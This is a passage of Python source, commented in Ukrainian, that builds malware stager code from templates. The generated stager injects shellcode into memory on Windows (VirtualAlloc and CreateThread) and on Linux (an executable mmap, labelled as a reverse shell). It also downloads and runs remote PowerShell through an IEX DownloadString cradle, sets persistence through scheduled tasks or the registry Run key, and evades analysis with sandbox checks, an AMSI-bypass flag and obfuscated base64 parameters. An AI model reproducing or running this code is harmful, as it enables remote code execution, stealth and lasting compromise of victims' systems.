        "                print(\"[PAYLOAD_RUNTIME_ERROR] Невірний формат шістнадцяткового шеллкоду.\")",
        "                return",
        "            shellcode_bytes_rt = bytes.fromhex(shellcode_hex_rt)",
        "            print(f\"[PAYLOAD_RUNTIME_INFO] Розмір шеллкоду: {{len(shellcode_bytes_rt)}} байт.\")",
        "            kernel32_rt_shell = ctypes.windll.kernel32", # Потребує ctypes
        "            MEM_COMMIT_RT = 0x00001000",
        "            MEM_RESERVE_RT = 0x00002000",
        "            PAGE_EXECUTE_READWRITE_RT = 0x40",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Виділення пам'яті...\")",
        "            ptr_rt = kernel32_rt_shell.VirtualAlloc(None, len(shellcode_bytes_rt), MEM_COMMIT_RT | MEM_RESERVE_RT, PAGE_EXECUTE_READWRITE_RT)",
        "            if not ptr_rt:",
        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка VirtualAlloc: {{ctypes.WinError()}}\")",
        "                return",
        "            print(f\"[PAYLOAD_RUNTIME_INFO] Пам'ять виділено за адресою: {{hex(ptr_rt)}}.\")",
        "            buffer_rt = (ctypes.c_char * len(shellcode_bytes_rt)).from_buffer_copy(shellcode_bytes_rt)",
        "            kernel32_rt_shell.RtlMoveMemory(ctypes.c_void_p(ptr_rt), buffer_rt, len(shellcode_bytes_rt))",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Шеллкод скопійовано в пам'ять.\")",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Створення потоку для виконання шеллкоду...\")",
        "            thread_id_rt = ctypes.c_ulong(0)",
        "            handle_rt = kernel32_rt_shell.CreateThread(None, 0, ctypes.c_void_p(ptr_rt), None, 0, ctypes.byref(thread_id_rt))",
        "            if not handle_rt:",
        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка CreateThread: {{ctypes.WinError()}}\")",
        "                kernel32_rt_shell.VirtualFree(ctypes.c_void_p(ptr_rt), 0, 0x00008000)",
        "                return",
        "            print(f\"[PAYLOAD_RUNTIME_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id_rt.value}}. Handle: {{handle_rt}}.\")",
        "        except Exception as e_shellcode_win_rt:",
        "            print(f\"[PAYLOAD_RUNTIME_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Windows: {{e_shellcode_win_rt}}\")",
        # Логіка для reverse_shell_tcp_shellcode_linux_x64
        "    elif arch_type == 'reverse_shell_tcp_shellcode_linux_x64':",
        "        print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Спроба ін'єкції шеллкоду для Linux x64...\")",
        "        try:",
        "            shellcode_hex_rt = payload_params.get('shellcode')",
        "            if not shellcode_hex_rt or len(shellcode_hex_rt) % 2 != 0:",
        "                print(\"[PAYLOAD_RUNTIME_ERROR] Невірний формат шістнадцяткового шеллкоду.\")",
        "                return",
        "            shellcode_bytes_rt = bytes.fromhex(shellcode_hex_rt)",
        "            print(f\"[PAYLOAD_RUNTIME_INFO] Розмір шеллкоду: {{len(shellcode_bytes_rt)}} байт.\")",
        "            libc_rt = ctypes.CDLL(None)", # Потребує ctypes
        "            PROT_READ_RT, PROT_WRITE_RT, PROT_EXEC_RT = 0x1, 0x2, 0x4",
        "            MAP_PRIVATE_RT, MAP_ANONYMOUS_RT = 0x02, 0x20",
        "            mmap_syscall_rt = libc_rt.mmap",
        "            mmap_syscall_rt.restype = ctypes.c_void_p",
        "            mmap_syscall_rt.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Виділення пам'яті через mmap...\")",
        "            mem_ptr_rt = mmap_syscall_rt(None, len(shellcode_bytes_rt), PROT_READ_RT | PROT_WRITE_RT | PROT_EXEC_RT, MAP_PRIVATE_RT | MAP_ANONYMOUS_RT, -1, 0)",
        "            if mem_ptr_rt == -1 or mem_ptr_rt == 0:",
        "                err_no_rt = ctypes.get_errno()",
        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка mmap: {{os.strerror(err_no_rt)}} (errno: {{err_no_rt}})\")", # Потребує os
        "                return",
        "            print(f\"[PAYLOAD_RUNTIME_INFO] Пам'ять виділено за адресою: {{hex(mem_ptr_rt)}}.\")",
        "            ctypes.memmove(mem_ptr_rt, shellcode_bytes_rt, len(shellcode_bytes_rt))",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Шеллкод скопійовано в пам'ять.\")",
        "            print(\"[PAYLOAD_RUNTIME_INFO] Створення вказівника на функцію та виклик шеллкоду...\")",
        "            shellcode_func_type_rt = ctypes.CFUNCTYPE(None)",
        "            shellcode_function_rt = shellcode_func_type_rt(mem_ptr_rt)",
        "            shellcode_function_rt()",
        "            print(\"[PAYLOAD_RUNTIME_SUCCESS] Шеллкод для Linux x64 (начебто) виконано.\")",
        "        except Exception as e_shellcode_linux_rt:",
        "            print(f\"[PAYLOAD_RUNTIME_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Linux: {{e_shellcode_linux_rt}}\")",
        # Логіка для powershell_downloader_stager
        "    elif arch_type == 'powershell_downloader_stager':",
        "        print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Спроба завантаження та виконання PowerShell скрипта з URL: {{payload_params.get('ps_url')}}\")",
        "        try:",
        "            ps_command_to_run_rt = f\"IEX (New-Object Net.WebClient).DownloadString('{payload_params.get('ps_url')}')\"",
        "            full_command_rt = ['powershell.exe']",
        "            if POWERSHELL_EXEC_ARGS:", # Використовує глобальну змінну стейджера
        "                full_command_rt.extend(POWERSHELL_EXEC_ARGS.split())",
        "            full_command_rt.extend(['-Command', ps_command_to_run_rt])",
        "            print(f\"[PAYLOAD_RUNTIME_INFO] Виконання команди: {{' '.join(full_command_rt)}}\")",
        "            result_rt = subprocess.run(full_command_rt, capture_output=True, text=True, check=False)", # Потребує subprocess
        "            if result_rt.returncode == 0:",
        "                print(f\"[PAYLOAD_RUNTIME_SUCCESS] PowerShell скрипт успішно виконано. STDOUT (перші 100 символів): {{result_rt.stdout[:100]}}...\")",
        "            else:",
        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка виконання PowerShell скрипта (код: {{result_rt.returncode}}). STDERR: {{result_rt.stderr}}\")",
        "        except Exception as e_ps_download_rt:",
        "            print(f\"[PAYLOAD_RUNTIME_ERROR ({{arch_type}})] Помилка під час завантаження/виконання PowerShell: {{e_ps_download_rt}}\")",
        # Логіка для windows_simple_persistence_stager
        "    elif arch_type == 'windows_simple_persistence_stager':",
        "        method_rt = payload_params.get('persistence_method')",
        "        command_rt = payload_params.get('command_to_persist')",
        "        name_rt = payload_params.get('artifact_name')",
        "        print(f\"[PAYLOAD_PERSISTENCE_RUNTIME] Встановлення персистентності. Метод: {{method_rt}}, Команда: '{{command_rt}}', Ім'я: '{{name_rt}}'\")",
        "        persist_cmd_parts_rt = []",
        "        success_msg_rt = ''",
        "        if os.name != 'nt':", # Потребує os
        "            print(\"[PAYLOAD_PERSISTENCE_ERROR_RT] Цей архетип призначений тільки для Windows.\")",
        "            return",
        "        try:",
        "            if method_rt == 'scheduled_task':",
        "                persist_cmd_parts_rt = ['schtasks', '/create', '/tn', name_rt, '/tr', command_rt, '/sc', 'ONLOGON', '/f']",
        "                success_msg_rt = f\"Заплановане завдання '{{name_rt}}' для команди '{{command_rt}}' (начебто) створено.\"",
        "            elif method_rt == 'registry_run_key':",
        "                registry_path_rt = r\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        "                persist_cmd_parts_rt = ['reg', 'add', registry_path_rt, '/v', name_rt, '/t', 'REG_SZ', '/d', command_rt, '/f']",
        "                success_msg_rt = f\"Запис реєстру '{{name_rt}}' в '{{registry_path_rt}}' для команди '{{command_rt}}' (начебто) створено.\"",
        "            else:",
        "                print(f\"[PAYLOAD_PERSISTENCE_ERROR_RT] Невідомий метод персистентності: {{method_rt}}\")",
        "                return",
        "",
        "            print(f\"[PAYLOAD_PERSISTENCE_EXEC_RT] Виконання команди: {{' '.join(persist_cmd_parts_rt)}}\")",
        "            proc_persist_rt = subprocess.run(persist_cmd_parts_rt, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')", # Потребує subprocess
        "            if proc_persist_rt.returncode == 0:",
        "                print(f\"[PAYLOAD_PERSISTENCE_SUCCESS_RT] {{success_msg_rt}}\")",
        "                print(f\"  STDOUT: {{proc_persist_rt.stdout}}\")",
        "            else:",
        "                print(f\"[PAYLOAD_PERSISTENCE_ERROR_RT] Помилка встановлення персистентності (код: {{proc_persist_rt.returncode}}):\")",
        "                print(f\"  STDOUT: {{proc_persist_rt.stdout}}\")",
        "                print(f\"  STDERR: {{proc_persist_rt.stderr}}\")",
        "        except Exception as e_persist_rt:",
        "            print(f\"[PAYLOAD_PERSISTENCE_FATAL_ERROR_RT] Непередбачена помилка: {{e_persist_rt}}\")",
        "",
        "    print(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Завершення логіки пейлоада.\")",
        "",
        "if __name__ == '__main__':",
        f"    print(f\"[STAGER_MAIN] Стейджер для '{archetype_name}' запускається...\")",
        "    sandbox_detected_flag_main = False",
        "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:",
        f"        sandbox_detected_flag_main = {evasion_func_name_runtime}()",
        "    if not sandbox_detected_flag_main:",
        f"        decoded_payload_parameters_json_main = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
        "        if \"DECODE_ERROR_RUNTIME\" in decoded_payload_parameters_json_main:",
        "            print(f\"[STAGER_MAIN_ERROR] Не вдалося розшифрувати параметри пейлоада: {{decoded_payload_parameters_json_main}}\")",
        "        else:",
        f"            {execute_func_name_runtime}(decoded_payload_parameters_json_main, \"{archetype_name}\")",
        "    else:",
        "        print(\"[STAGER_MAIN] Виявлено аналітичне середовище, нормальний шлях виконання пропущено.\")",
        "    print(\"[STAGER_MAIN] Стейджер завершив роботу.\")"
    ])
    
    final_stager_code = "\n".join(line for line in stager_code_lines if line.strip() or line == "")
    log_messages.append(f"[STAGER_TEMPLATE_SUCCESS] Код для архетипу {archetype_name} згенеровано.")
    return final_stager_code

